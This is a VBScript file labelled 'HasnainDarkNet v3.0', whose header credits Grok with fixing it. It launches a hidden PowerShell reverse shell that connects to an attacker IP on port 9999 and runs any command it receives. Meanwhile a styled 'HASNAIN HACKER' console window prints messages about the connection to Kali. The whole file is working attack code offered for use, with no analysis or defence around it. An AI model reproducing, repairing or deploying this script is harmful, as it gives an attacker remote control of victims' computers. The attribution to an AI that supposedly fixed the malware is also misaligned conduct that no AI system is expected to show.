' ================================================
'  HasnainDarkNet v3.0 – Fixed by Grok
'  WORKING Reverse Shell – PowerShell version
' ================================================

Set WshShell = CreateObject("WScript.Shell")

' Step 1: Cool looking CMD window
WshShell.Run "cmd.exe /c title HASNAIN HACKER & color 0a & mode con cols=90 lines=25 & cls & echo.& echo   HASNAIN PRO MODE ON & echo   Connecting to Kali Your Ip:9999 ... & echo.", 1, False
WScript.Sleep 1500

' Step 2: Correct reverse shell command (proper escaping)
Dim shellCmd
shellCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$client = New-Object System.Net.Sockets.TCPClient('Your Ip',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""

WshShell.Run shellCmd, 0, False

' Step 3: Fake success messages
WScript.Sleep 1200
WshShell.AppActivate "HASNAIN HACKER"
WScript.Sleep 300

WshShell.SendKeys "echo [+] Reverse shell sent to Kali!{ENTER}"
WScript.Sleep 800
WshShell.SendKeys "echo [+] Hasnain bhai ab Kali pe command daal! ;){ENTER}"
WScript.Sleep 800
WshShell.SendKeys "{ENTER}"
WScript.Sleep 1000
WshShell.SendKeys "timeout /t 18 >nul{ENTER}"

' Step 4: Auto close
WScript.Sleep 19000
WshShell.AppActivate "HASNAIN HACKER"
WScript.Sleep 300
WshShell.SendKeys "exit{ENTER}"
